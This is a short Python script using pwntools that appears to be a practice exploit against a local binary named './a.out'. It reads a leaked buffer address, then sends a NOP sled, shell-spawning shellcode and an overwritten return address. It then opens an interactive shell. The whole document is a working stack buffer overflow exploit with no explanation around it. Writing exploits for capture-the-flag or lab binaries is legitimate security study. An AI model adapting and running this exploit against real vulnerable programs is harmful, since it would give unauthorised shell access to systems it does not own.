from pwn import *

shellcode = asm(shellcraft.sh())

elf = context.binary = ELF('./a.out')
p = process()

p.recvuntil('at: ')
buffer_addr = int(p.recvline(), 16) + 8
log.info(f"Leaked buffer address: {hex(buffer_addr)}")

buffer_size = 64
padding = 1
nop_sled = b'\x90' * (268 - len(shellcode))

payload = flat(
    nop_sled + 
    shellcode +
    #b'A' * (buffer_size - len(nop_sled) - len(shellcode)) + 
    #b'B' * padding +
    p64(buffer_addr) 
)

p.sendline(payload)  # NOP sled + shellcode + payload

p.interactive()
